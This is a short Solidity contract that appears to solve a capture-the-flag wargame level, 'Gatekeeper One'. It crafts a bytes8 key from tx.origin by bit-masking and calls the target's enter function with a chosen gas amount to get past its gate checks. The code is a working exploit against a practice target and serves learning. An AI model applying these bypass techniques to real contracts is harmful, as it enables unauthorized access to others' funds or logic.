// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PwnGatekeeperOne {
    function pwn(address target, uint256 gas) external {
        bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) | 0x100000000000000);
        (bool success,) = target.call{gas: gas}(abi.encodeWithSignature("enter(bytes8)", key));
        require(success);
    }
}
